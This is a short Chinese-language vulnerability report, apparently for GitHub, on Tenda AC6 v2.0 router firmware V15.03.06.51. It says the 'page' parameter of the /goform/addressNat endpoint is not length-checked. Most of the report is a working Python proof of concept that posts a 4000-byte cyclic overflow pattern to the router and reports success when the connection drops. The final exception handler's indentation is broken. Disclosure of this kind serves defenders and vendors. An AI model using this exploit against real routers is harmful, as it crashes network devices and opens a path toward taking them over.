固件下载地址：https://www.tendacn.com/se/material/show/103794

版本：AC6 v2.0 Firmware_V15.03.06.51

漏洞点:  post传参时没限制page的长度
<img width="424" height="302" alt="image" src="https://github.com/user-attachments/assets/2c57e736-9372-4978-b5ab-d91729df070e" />

Poc：
import requests

from pwn import *

from requests.exceptions import ConnectionError, ReadTimeout


IP = "192.168.252.136"

PORT = 80

URL = f"http://{IP}:{PORT}/goform/addressNat"

PAYLOAD_LEN = 4000

pattern = cyclic(PAYLOAD_LEN).decode('utf-8')

print(f"[*] 锁定目标接口: {URL}")

print(f"[*] 正在生成 {PAYLOAD_LEN} 字节的探测 Payload...")
print(f"[*] Payload 弹头: {pattern[:40]}...")

cookies = {
    "password": "recmji"
}

data = {
    # 核心溢出点：注入特征码
    "page": pattern,
    # 附带其它必须参数，防止进入异常分支
    "entrys": "1",
    "mitInterface": "1"
}

try:
    print("\n[*] 发射 Payload！BOOM！")
    # timeout 设为短时间，因为如果触发成功，连接会直接断开或卡死
    res = requests.post(URL, cookies=cookies, data=data, timeout=3)
    
except (ConnectionError, ReadTimeout) as e:
    print("\n[+] 完美命中！HTTP 连接已异常中断。")
    print("="*50)
except Exception as e:
print(f"[-] 发生意料之外的错误: {e}")

<img width="938" height="364" alt="image" src="https://github.com/user-attachments/assets/41784099-a046-4e48-ba1e-e53f0f8b21df" />

